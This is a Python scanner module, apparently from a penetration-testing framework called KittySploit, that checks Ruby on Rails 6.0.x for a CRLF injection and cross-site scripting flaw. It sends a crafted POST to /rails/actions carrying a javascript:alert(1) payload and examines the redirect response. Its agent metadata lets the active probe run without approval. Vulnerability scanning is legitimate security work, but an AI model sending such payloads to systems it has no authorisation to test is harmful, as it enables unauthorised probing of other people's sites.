#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruby on Rails 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruby on Rails - CRLF Injection and Cross-Site Scripting Detection',
        'description': 'Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'rails', 'xss', 'crlf', 'hackerone', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://hackerone.com/reports/904059'],
    }

    def run(self):
        path = '/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa'
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 302:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('javascript:alert(1)',)
        header_all = ('Location: aaaaa', 'text/html',)
        if (any(m in body for m in body_any)) and (all(m in headers for m in header_all)):
            self.set_info(
                severity='medium',
                reason='Ruby on Rails - CRLF Injection and Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

